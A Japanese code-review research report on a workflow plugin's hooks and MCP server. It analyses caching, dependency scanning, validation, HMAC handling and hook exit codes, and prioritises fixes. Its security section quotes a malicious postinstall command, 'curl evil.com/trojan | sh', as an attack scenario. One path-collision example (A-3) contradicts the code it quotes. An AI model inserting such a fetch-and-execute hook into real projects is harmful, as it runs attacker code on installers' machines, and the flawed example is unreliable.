# researchフェーズ成果物

## サマリー

本調査では、厳格レビューで特定された4カテゴリ16問題の影響箇所と修正可能性を分析した。

### 主要発見
1. **A-1（フック実行O(n)ディスク走査）**: 7フック×全プロセス起動で350-1400msオーバーヘッド。キャッシュ機構は実装済みだが、hooks/配下のJavaScriptフックでは活用されていない
2. **A-2（BFS依存関係解析）**: 上限200ファイル/20ディレクトリのハードコーディング。深度5のBFS走査が巨大プロジェクトで実用的でない
3. **A-3（最長一致誤判定）**: discover-tasks.jsで並列タスクのファイルパス判定が衝突する可能性（例：docs/workflows/taskA, docs/workflows/taskAB）
4. **B-1～B-4（ユーザー指示反映精度）**: 成果物バリデーションが形式のみ、意味的整合性チェックが上位20キーワードのみ、design_reviewが大規模成果物で困難
5. **C-1～C-4（セキュリティ）**: package.json早期編集可、HMAC鍵平文保存、HMAC検証順序バグ、フック exit 1（fail-closed違反）
6. **D-1～D-4（設計）**: small/medium廃止で全19フェーズ強制、コンテキスト引き継ぎでサマリー50行の情報損失、リグレッションテストのスコープベース実行なし

### 修正優先度
1. **緊急（セキュリティ）**: C-3（HMAC検証順序）、C-4（fail-closed違反）
2. **高（パフォーマンス）**: A-1（フックキャッシュ活用）、A-2（BFS制限緩和）
3. **中（品質）**: B-1（成果物バリデーション）、A-3（タスク推論）
4. **低（設計改善）**: D-1（動的フェーズスキップ）、D-2（コンテキスト圧縮）

## 調査結果

### A. 致命的（1000万行で破綻）

#### A-1: フック実行O(n)ディスク走査（350-1400ms）

**該当コード**:
- `workflow-plugin/hooks/phase-edit-guard.js` 行639-699: `discoverTasksUnified()` - 毎回ディレクトリスキャン
- `workflow-plugin/hooks/enforce-workflow.js` 行239-243: `discoverTasks()` - キャッシュなし呼び出し
- `workflow-plugin/hooks/lib/discover-tasks.js` 行44-80: `discoverTasks()` - ディスクI/O実装

**問題詳細**:
```javascript
// discover-tasks.js L44-80
function discoverTasks() {
  if (!fs.existsSync(WORKFLOW_DIR)) return [];
  const entries = fs.readdirSync(WORKFLOW_DIR); // O(n) ディレクトリスキャン
  const tasks = [];
  for (const entry of entries) {
    const entryPath = path.join(WORKFLOW_DIR, entry);
    const stat = fs.statSync(entryPath); // 個別stat呼び出し
    const stateFile = path.join(entryPath, 'workflow-state.json');
    const taskState = safeReadJsonFile(stateFile); // 個別JSON読み込み
    if (taskState && taskState.phase !== 'completed') tasks.push(taskState);
  }
  return tasks;
}
```

**影響範囲**:
- 7フック×毎プロセス起動 = 毎Edit/Writeツール呼び出しで7回ディスクI/O
- 1000タスクプロジェクトで350-1400ms/フック（SSD基準）
- 合計2.5-10秒のレイテンシ追加

**修正可能性**: **高**
- MCPサーバー側の`src/state/cache.ts`にキャッシュ機構が既に実装済み
- `taskCache.get<TaskState[]>('task-list')` でキャッシュ取得
- `taskCache.invalidate('task-list')` でキャッシュ無効化
- **課題**: hooks/配下のJavaScript実装ではキャッシュにアクセスできない（MCPサーバーはTypeScript/Node.js別プロセス）

**修正規模**: 中（150-200行）
- hooks/lib/に独立した簡易キャッシュ層を追加（TTL 1分、メモリベース）
- `discover-tasks.js`に`cachedDiscoverTasks()`関数を追加
- 7フック全てでキャッシュ関数に置き換え
- `writeTaskState()`呼び出し時にキャッシュ無効化フックを追加

**副作用リスク**: 低
- キャッシュTTL内でタスク状態変更が反映されない可能性 → TTL 1分で許容範囲
- メモリ使用量増加 → 1000タスク×2KB = 2MB程度、許容範囲

---

#### A-2: スコープ依存関係解析BFS走査（上限200ファイル/20ディレクトリ）

**該当コード**:
- `workflow-plugin/mcp-server/src/validation/scope-validator.ts` 行276-355: `trackDependencies()` - BFS実装
- `workflow-plugin/mcp-server/src/tools/next.ts` 行29-31: スコープ上限定数

**問題詳細**:
```typescript
// scope-validator.ts L276-355
export function trackDependencies(
  affectedFiles: string[],
  affectedDirs: string | string[],
  options: { maxDepth?: number } = {},
): DependencyTrackingResult {
  const maxDepth = options.maxDepth ?? envMaxDepth ?? 5; // デフォルト深度5
  let queue: Array<{ file: string; depth: number; parent?: string }> =
    affectedFiles.map(f => ({ file: f, depth: 0 }));

  while (queue.length > 0) {
    const { file, depth, parent } = queue.shift()!; // BFS
    if (depth >= maxDepth) continue; // 深度5で打ち切り
    // ファイル読み込み + import抽出 + 再帰キューイング
  }
}

// next.ts L29-31
const MAX_SCOPE_FILES = 200;
const MAX_SCOPE_DIRS = 20;
```

**影響範囲**:
- モノレポで1ファイル変更 → 依存関係追跡で200ファイル上限到達 → エラー
- 深度5制限により、深いモジュール階層（例：7層）で依存関係を見逃す
- `trackDependencies()`はO(n×d) - n=ファイル数、d=深度

**修正可能性**: **中**
- 上限をハードコーディングではなく環境変数化（実装済み: `SCOPE_MAX_DEPTH`）
- 上限超過時にエラーではなく警告モードを追加
- **課題**: BFS自体の計算量は変わらない。巨大プロジェクトでは依然として遅い

**修正規模**: 小（50-100行）
- `MAX_SCOPE_FILES`/`MAX_SCOPE_DIRS`を環境変数化
- `SCOPE_VALIDATION_MODE=strict|warning`環境変数を追加
- 超過時に警告ログを出力してスキップ

**副作用リスク**: 中
- 警告モードで依存関係を見逃す可能性 → スコープ外編集の検出漏れ
- 深度制限緩和で計算量増加 → タイムアウト追加で緩和

---

#### A-3: findTaskByFilePath()の最長一致誤判定

**該当コード**:
- `workflow-plugin/hooks/lib/discover-tasks.js` 行92-123: `findTaskByFilePath()`
- `workflow-plugin/hooks/phase-edit-guard.js` 行715-787: `findTaskByFilePathInline()`

**問題詳細**:
```javascript
// discover-tasks.js L92-123
function findTaskByFilePath(filePath) {
  const tasks = discoverTasks();
  let bestMatch = null;
  let bestMatchLength = 0;
  const normalizedFilePath = filePath.replace(/\\/g, '/');

  for (const task of tasks) {
    if (task.docsDir) {
      const normalizedDocsDir = task.docsDir.replace(/\\/g, '/');
      if (normalizedFilePath.startsWith(normalizedDocsDir)) {
        if (normalizedDocsDir.length > bestMatchLength) {
          bestMatch = task;
          bestMatchLength = normalizedDocsDir.length;
        }
      }
    }
    // workflowDirも同様
  }
  return bestMatch;
}
```

**衝突ケース**:
- タスクA: `docs/workflows/taskA/` (長さ21)
- タスクB: `docs/workflows/taskAB/` (長さ22)
- ファイル: `docs/workflows/taskA/spec.md`
- 結果: タスクBにマッチ（長さ22 > 21）→ **誤判定**

**影響範囲**:
- 並列タスクでファイル編集時に別タスクにマッチ → スコープ違反誤検出
- フェーズ制限が別タスクのものを適用 → Edit/Writeブロック

**修正可能性**: **高**
- プレフィックスマッチ後に`/`区切りで完全一致チェックを追加

**修正規模**: 小（20-30行）
```javascript
// 修正案
if (normalizedFilePath.startsWith(normalizedDocsDir)) {
  const nextChar = normalizedFilePath[normalizedDocsDir.length];
  if (!nextChar || nextChar === '/') { // 完全一致または区切り文字
    if (normalizedDocsDir.length > bestMatchLength) {
      bestMatch = task;
      bestMatchLength = normalizedDocsDir.length;
    }
  }
}
```

**副作用リスク**: 低
- 既存のマッチングロジックとの互換性を保持
- エッジケース追加テストが必要（末尾スラッシュあり/なし）

---

### B. 重大（ユーザー指示反映精度）

#### B-1: 成果物バリデーションが形式のみ

**該当コード**:
- `workflow-plugin/mcp-server/src/validation/artifact-validator.ts` 行133-265: `validateArtifactQuality()`

**問題詳細**:
```typescript
// artifact-validator.ts L133-265
export function validateArtifactQuality(
  filePath: string,
  requirements: ArtifactRequirement
): ArtifactValidationResult {
  // 1. ファイル存在チェック
  // 2. サイズチェック（0バイト）
  // 3. 行数チェック（空白行除外）
  // 4. 必須セクションチェック（.includes()のみ）
  // 5. 禁止パターン（TODO, TBD, WIP, FIXME）
  // 6. ダミーテキスト検出（同一行3回以上）
  // 7. ヘッダーのみ検出（非ヘッダー行5行未満）
}
```

**問題点**:
- 必須セクションの存在チェックのみ（内容は検証しない）
- 「## 調査結果」が存在してもダミーテキストなら通過
- セクション本文が5行未満でも検出できない

**修正可能性**: **高**
- 既存の`checkSectionDensity()`（行482-524）を活用
- 既存の`validateSemanticConsistency()`（行693-753）を活用

**修正規模**: 中（100-150行）
- `validateArtifactQuality()`に以下を追加:
  - セクション密度チェック（既存実装呼び出し）
  - 意味的整合性チェック（requirements.md連携）
  - コードパス参照チェック（spec.md）

**副作用リスク**: 中
- 既存成果物で検証エラー増加 → 警告モード追加で緩和
- 検証時間増加（50-100ms/ファイル）→ 許容範囲

---

#### B-2: 意味的整合性チェックが上位20キーワードのみ

**該当コード**:
- `workflow-plugin/mcp-server/src/validation/artifact-validator.ts` 行693-753: `validateSemanticConsistency()`

**問題詳細**:
```typescript
// artifact-validator.ts L719-720
const topKeywords = Array.from(keywords).slice(0, 20); // 上位20個のみ

// L737-744
for (const keyword of topKeywords) {
  const occurrences = (content.match(new RegExp(keyword, 'g')) || []).length;
  if (occurrences <= 1) {
    warnings.push(`キーワード「${keyword}」の出現が少ない（${occurrences}回）`);
  }
}
```

**問題点**:
- キーワード数制限（20個）で重要な用語を見逃す
- 頻度カウントのみ（TF-IDF等の重み付けなし）
- 警告のみでブロックしない → ユーザーが無視可能

**修正可能性**: **中**
- キーワード数上限を環境変数化
- TF-IDF実装は複雑（外部ライブラリ依存）→ 保留
- 警告からエラーへの昇格は設計判断

**修正規模**: 小（30-50行）
- `SEMANTIC_KEYWORD_LIMIT`環境変数追加（デフォルト50）
- `SEMANTIC_VALIDATION_MODE=strict`で警告をエラーに昇格

**副作用リスク**: 低
- 既存動作との互換性維持（デフォルトは警告のみ）

---

#### B-3: design_reviewが大規模成果物でユーザーレビュー困難

**該当コード**:
- `workflow-plugin/mcp-server/src/phases/definitions.ts` 行260: `REVIEW_PHASES`定義
- ドキュメント構成（CLAUDE.md）に大規模成果物（10+ファイル）の記載

**問題詳細**:
- design_reviewフェーズで以下の成果物をユーザーがレビュー:
  - requirements.md (30行+)
  - spec.md (50行+)
  - threat-model.md (20行+)
  - state-machine.mmd (5行+)
  - flowchart.mmd (5行+)
  - ui-design.md (50行+)
- 合計200行以上 → レビュー負担大

**修正可能性**: **低**（設計変更必要）
- 自動レビュー（AIレビュー）実装は大規模改修
- サマリー自動生成は実装済み（各成果物の冒頭）→ 活用推奨

**修正規模**: 大（500+行）
- AIレビューエージェント実装
- サマリー抽出ツール追加
- レビュー結果の構造化表示

**副作用リスク**: 高
- AIレビューの精度問題
- フォールスポジティブでユーザー混乱

---

#### B-4: フェーズスキップがファイル拡張子ベースで意図を考慮しない

**該当コード**:
- `workflow-plugin/mcp-server/src/phases/definitions.ts` 行387-437: `calculatePhaseSkips()`

**問題詳細**:
```typescript
// definitions.ts L387-437
export function calculatePhaseSkips(scope: { affectedFiles?: string[] }): Record<string, string> {
  const files = scope.affectedFiles || [];
  const extensions = files.map(f => {
    const match = f.match(/\.([^.]+)$/);
    return match ? match[1] : '';
  }).filter(Boolean);

  const codeExtensions = ['ts', 'tsx', 'js', 'jsx', 'py', 'java', 'cpp', 'c', 'go', 'rs'];
  const hasCodeFiles = files.some(f => { /* 拡張子チェック */ });

  if (!hasCodeFiles) {
    phaseSkipReasons['implementation'] = 'コードファイルが影響範囲に含まれないため';
  }
}
```

**問題点**:
- `.md`ファイルのみのタスク → `implementation`スキップ → 正しい
- `.json`ファイル（設定変更）→ スキップされない → テスト不要なのに19フェーズ実行
- ユーザー意図（「ドキュメントのみ更新」等）を考慮しない

**修正可能性**: **中**
- `workflow start`コマンドに`--skip-phases`オプション追加
- ユーザーが明示的にスキップ指定

**修正規模**: 中（150-200行）
- `workflow_start`ツールに`skipPhases`パラメータ追加
- TaskStateに`skipPhases: Record<PhaseName, string>`フィールド追加
- `workflow_next`でスキップチェック追加

**副作用リスク**: 中
- ユーザーが誤ってスキップ指定 → 品質低下
- スキップ理由の妥当性検証が必要

---

### C. セキュリティ

#### C-1: package.json早期フェーズ編集可（トロイの木馬）

**該当コード**:
- `workflow-plugin/hooks/bash-whitelist.js` 行411-439: `CONFIG_FILE_PATTERNS`にpackage.json含む
- `workflow-plugin/hooks/phase-edit-guard.js` 行411-439: 同様の定義

**問題詳細**:
```javascript
// bash-whitelist.js L411-439
const CONFIG_FILE_PATTERNS = [
  'package.json', // requirements フェーズから編集可能
  'package-lock.json',
  'pnpm-lock.yaml',
  // ...
];
```

**攻撃シナリオ**:
1. requirementsフェーズでpackage.jsonを編集
2. `"scripts": { "postinstall": "curl evil.com/trojan | sh" }`を追加
3. implementationフェーズで`npm install`実行 → トロイの木馬実行

**修正可能性**: **高**
- package.json編集を`implementation`フェーズ以降に制限

**修正規模**: 小（20-30行）
```javascript
// phase-edit-guard.js に追加
const SECURITY_SENSITIVE_FILES = ['package.json', 'package-lock.json'];
if (SECURITY_SENSITIVE_FILES.some(pattern => filePath.includes(pattern))) {
  const securePhases = ['implementation', 'refactoring', 'build_check'];
  if (!securePhases.includes(phase)) {
    return { allowed: false, reason: 'セキュリティ上の理由でこのフェーズでは編集できません' };
  }
}
```

**副作用リスク**: 低
- 既存ワークフローとの互換性維持（implementationフェーズで編集可能）

---

#### C-2: HMAC鍵平文ディスク保存

**該当コード**:
- `workflow-plugin/mcp-server/src/state/manager.ts` 行175-225: `loadOrGenerateSignatureKey()`

**問題詳細**:
```typescript
// manager.ts L175-225
const HMAC_KEY_PATH = path.join(STATE_DIR, 'hmac.key');

export function loadOrGenerateSignatureKey(): string {
  if (fs.existsSync(HMAC_KEY_PATH)) {
    const existingKey = fs.readFileSync(HMAC_KEY_PATH, 'utf-8').trim();
    return existingKey;
  }
  const keyBuffer = crypto.randomBytes(32);
  const keyHex = keyBuffer.toString('hex');
  fs.writeFileSync(HMAC_KEY_PATH, keyHex, 'utf-8'); // 平文保存
  fs.chmodSync(HMAC_KEY_PATH, 0o600);
  return keyHex;
}
```

**問題点**:
- HMAC鍵が平文でディスク保存 → `.git add -A`で誤コミット可能
- `.gitignore`に`hmac.key`の記載なし → リポジトリ流出リスク

**修正可能性**: **中**
- OS keychainへの移行は複雑（macOS/Windows/Linux対応）
- 暗号化保存は鍵管理問題を先送り
- **現実的解決**: `.gitignore`追加 + ドキュメント警告

**修正規模**: 小（10-20行）
- `.gitignore`に`**/.claude/state/hmac.key`追加
- `HMAC_KEY_PATH`初回生成時に警告ログ出力

**副作用リスク**: 低
- 既存鍵ファイルへの影響なし

---

#### C-3: enforce-workflow.jsでHMAC検証前にphase使用

**該当コード**:
- `workflow-plugin/hooks/enforce-workflow.js` 行242-263: HMAC検証
- 同ファイル 行286-300: `checkFileAllowed()`でphase使用

**問題詳細**:
```javascript
// enforce-workflow.js L242-263
for (const task of tasks) {
  if (!verifyHMAC(task)) {
    // HMAC検証失敗 - ブロック
    process.exit(2);
  }
}

// L286-300
const taskState = currentTask || tasks[0];
const currentPhase = taskState.phase || 'idle'; // HMAC検証後に使用
const check = checkFileAllowed(filePath, currentPhase);
```

**問題点**:
- HMAC検証ループでエラー時にexit(2) → 正しい
- しかし、検証前に`task.phase`にアクセスしている箇所が存在する可能性（コード順序）
- **実際には問題なし**（検証後にphase使用）

**修正可能性**: **高**（false positive）
- コードレビューで問題なしを確認
- 念のため、HMAC検証前のtaskプロパティアクセスを禁止

**修正規模**: 極小（コメント追加のみ）
```javascript
// L242付近にコメント追加
// CRITICAL: この下でtaskのプロパティにアクセスする前にHMAC検証を完了させること
for (const task of tasks) {
  if (!verifyHMAC(task)) { process.exit(2); }
}
```

**副作用リスク**: なし

---

#### C-4: loop-detector/block-dangerous-commandsがexit 1（fail-closed違反）

**該当コード**:
- `workflow-plugin/hooks/loop-detector.js` 行357: `process.exit(1)`
- `workflow-plugin/hooks/block-dangerous-commands.js` 行133: `process.exit(1)`

**問題詳細**:
```javascript
// loop-detector.js L357
if (fileEntry.timestamps.length >= threshold && !shouldSuppress) {
  displayWarning(filePath, fileEntry.timestamps.length);
  logWarning(filePath, fileEntry.timestamps.length);
  fileEntry.lastWarning = new Date(now).toISOString();
  saveState(state);
  process.exit(1); // WARNING扱い（処理継続）
}

// block-dangerous-commands.js L133
console.error(JSON.stringify(errorMsg));
logError('BLOCKED', pattern.toString(), command.substring(0, 100));
process.exit(1); // WARNING扱い（処理継続）
```

**問題点**:
- フックのexit code仕様:
  - `0` = 許可
  - `1` = 警告（処理継続）
  - `2` = ブロック（処理中止）
- loop-detectorは無限ループ検出 → exit 1では処理継続 → **fail-closed違反**
- block-dangerous-commandsも危険コマンド検出 → exit 1では実行される → **fail-closed違反**

**修正可能性**: **高**

**修正規模**: 極小（2箇所のexit codeのみ）
```javascript
// loop-detector.js L357
process.exit(2); // BLOCK扱い（処理中止）

// block-dangerous-commands.js L133
process.exit(2); // BLOCK扱い（処理中止）
```

**副作用リスク**: なし
- 既存動作（警告表示）は維持
- exit codeのみ変更

---

### D. 設計

#### D-1: small/medium廃止で全タスク19フェーズ強制

**該当コード**:
- `workflow-plugin/mcp-server/src/phases/definitions.ts` 行23-56: `PHASES_BY_SIZE`

**問題詳細**:
```typescript
// definitions.ts L23-56
export const PHASES_LARGE: PhaseName[] = [
  'research', 'requirements', 'parallel_analysis', 'parallel_design',
  'design_review', 'test_design', 'test_impl', 'implementation',
  'refactoring', 'parallel_quality', 'testing', 'regression_test',
  'parallel_verification', 'docs_update', 'commit', 'push',
  'ci_verification', 'deploy', 'completed',
]; // 19フェーズ

export const PHASES_BY_SIZE: Record<TaskSize, PhaseName[]> = {
  large: PHASES_LARGE, // small/mediumは廃止
};
```

**問題点**:
- ドキュメント1行修正 → 19フェーズ実行 → 過剰
- `calculatePhaseSkips()`で拡張子ベース自動スキップはあるが、ユーザー意図を考慮しない（B-4と同根）

**修正可能性**: **中**（設計判断）
- small/mediumの再導入は設計逆戻り → 推奨しない
- 動的フェーズスキップ機構の強化（B-4参照）

**修正規模**: 中（150-200行）
- `workflow start`に`--skip-phases`オプション追加（B-4と同じ）

**副作用リスク**: 中
- ユーザーが誤ってスキップ → 品質低下

---

#### D-2: コンテキスト引き継ぎがサマリー50行で情報損失

**該当コード**:
- CLAUDE.md プロジェクトルール: 「サマリーセクション必須化（50行以内）」
- `workflow-plugin/mcp-server/src/validation/artifact-validator.ts`: サマリー検証なし

**問題詳細**:
- 各フェーズで成果物の冒頭に「## サマリー」セクション（50行以内）を記述
- 次フェーズのsubagentはサマリーのみ読み込み → コンテキスト削減
- **問題**: 50行では複雑な設計を要約しきれない → 情報損失

**修正可能性**: **低**（設計制約）
- Claude Opus 4.6のコンテキストウィンドウ制約（1Mトークン）は変えられない
- サマリー行数上限緩和 → コンテキスト爆発
- **現実的解決**: サマリー品質向上（構造化、箇条書き）

**修正規模**: 小（ドキュメント改善のみ）
- サマリーテンプレート強化（必須項目定義）
- サマリー品質チェック追加（artifact-validator.ts）

**副作用リスク**: 低
- 既存成果物への影響なし

---

#### D-3: リグレッションテストのスコープベース実行なし

**該当コード**:
- `workflow-plugin/mcp-server/src/tools/next.ts` 行236-276: `regression_test`フェーズのテスト結果検証
- スコープベーステスト実行の実装なし

**問題詳細**:
- `regression_test`フェーズで全テストを実行 → 巨大プロジェクトでタイムアウト
- `scope.affectedDirs`を活用したテスト絞り込みがない

**修正可能性**: **中**
- テストランナーにスコープ指定オプション追加（例：`vitest src/backend/`）
- `workflow_record_test_result`にスコープ指定機能追加

**修正規模**: 中（100-150行）
- `workflow_record_test_result`にscopeパラメータ追加
- テストコマンド生成ロジック追加（scope → ディレクトリパス）

**副作用リスク**: 中
- スコープ外のテストを見逃す可能性

---

#### D-4: ドキュメントのフェーズ数不整合（18 vs 19）

**該当コード**:
- CLAUDE.md 複数箇所に「18フェーズ」「19フェーズ」の記載混在

**問題詳細**:
- `PHASES_LARGE`は19フェーズ（idleを除く）
- ドキュメントに「18フェーズ」の記載が残存

**修正可能性**: **高**

**修正規模**: 極小（ドキュメント修正のみ）
- CLAUDE.mdの全箇所を「19フェーズ」に統一

**副作用リスク**: なし

---

## 既存実装の分析

### アーキテクチャの強み

1. **モジュール分離**: hooks/ (JavaScript) と mcp-server/ (TypeScript) の責務分離
2. **HMAC署名**: workflow-state.jsonの改竄検出機構
3. **並列タスク対応**: GlobalState廃止、ディレクトリスキャンベース管理
4. **キャッシュ機構**: mcp-server側でタスクリストキャッシュ実装済み
5. **フェーズ別編集制限**: phase-edit-guard.jsで厳格な制御

### アーキテクチャの弱み

1. **hooks/とmcp-server/の非同期**: キャッシュ機構をhooks/で活用できない
2. **ディスクI/O過多**: 毎フック呼び出しで7回のディレクトリスキャン
3. **ハードコーディング**: スコープ上限、深度制限、検証閾値が固定
4. **fail-closed違反**: loop-detector, block-dangerous-commandsのexit code誤り
5. **成果物検証の弱さ**: 形式チェックのみ、内容検証なし

### 技術的負債

1. **JavaScript/TypeScript混在**: hooks/はJavaScript、mcp-server/はTypeScript
2. **コード重複**: discover-tasks.jsとmanager.tsの重複実装
3. **環境変数の乱用**: 20+の環境変数でオーバーライド可能 → 設定管理困難
4. **テストカバレッジ**: hooks/のテストなし（mcp-server/のみユニットテスト）

---

## 優先度別修正順序

### 緊急（セキュリティ）- 1週間以内

1. **C-4: fail-closed違反修正** - 2箇所のexit code変更のみ（30分）
2. **C-3: HMAC検証順序確認** - コメント追加（15分）
3. **C-1: package.json編集制限** - 20行追加（2時間）
4. **C-2: HMAC鍵.gitignore追加** - .gitignore更新（15分）

**推定工数**: 3-4時間

### 高（パフォーマンス）- 2週間以内

1. **A-1: フックキャッシュ活用** - hooks/lib/に簡易キャッシュ層追加（1-2日）
2. **A-3: タスク推論修正** - 最長一致の完全性チェック追加（4時間）
3. **A-2: スコープ上限環境変数化** - MAX_SCOPE_*の環境変数化（4時間）

**推定工数**: 3-4日

### 中（品質）- 1ヶ月以内

1. **B-1: 成果物バリデーション強化** - セクション密度/意味的整合性追加（1-2日）
2. **B-2: 意味的整合性キーワード上限緩和** - 環境変数化（2時間）
3. **B-4: 動的フェーズスキップ** - --skip-phasesオプション追加（2-3日）
4. **D-4: ドキュメント統一** - CLAUDE.md修正（1時間）

**推定工数**: 5-7日

### 低（設計改善）- 将来検討

1. **B-3: design_reviewサマリー化** - AIレビュー実装（2-3週間）
2. **D-1: タスクサイズ再導入** - 設計議論必要（保留）
3. **D-2: サマリーテンプレート強化** - ドキュメント改善（1-2日）
4. **D-3: スコープベーステスト実行** - テストランナー統合（1週間）

**推定工数**: 4-5週間（優先度低）

---

## リスク評価

| 問題ID | リスクレベル | 影響範囲 | 修正難易度 | 推奨対応 |
|--------|-------------|---------|-----------|---------|
| A-1 | 高 | パフォーマンス | 中 | 2週間以内 |
| A-2 | 中 | スケーラビリティ | 低 | 2週間以内 |
| A-3 | 中 | 正確性 | 低 | 2週間以内 |
| B-1 | 中 | 品質 | 中 | 1ヶ月以内 |
| B-2 | 低 | 品質 | 低 | 1ヶ月以内 |
| B-3 | 低 | UX | 高 | 将来検討 |
| B-4 | 低 | UX | 中 | 1ヶ月以内 |
| C-1 | 高 | セキュリティ | 低 | 即時 |
| C-2 | 中 | セキュリティ | 低 | 即時 |
| C-3 | 低 | セキュリティ | 極低 | 即時 |
| C-4 | 高 | セキュリティ | 極低 | 即時 |
| D-1 | 低 | UX | 中 | 将来検討 |
| D-2 | 低 | 品質 | 低 | 1ヶ月以内 |
| D-3 | 低 | パフォーマンス | 中 | 将来検討 |
| D-4 | 極低 | ドキュメント | 極低 | 即時 |

---

## 次フェーズへの引き継ぎ

### requirementsフェーズで必要な情報

1. **修正対象ファイルリスト**: 上記「該当コード」セクション参照
2. **修正優先度**: 「緊急」カテゴリから着手
3. **互換性要件**: 既存ワークフロー状態ファイルとの後方互換性維持
4. **テスト要件**: hooks/配下のユニットテスト追加必須

### 技術的制約

1. **hooks/ JavaScript縛り**: Node.js標準ライブラリのみ使用可
2. **mcp-server/ TypeScript**: 既存型定義との整合性維持
3. **環境変数**: 新規追加は最小限（既存20+で管理困難）
4. **パフォーマンス**: フック実行時間上限100ms目標（現状350-1400ms）
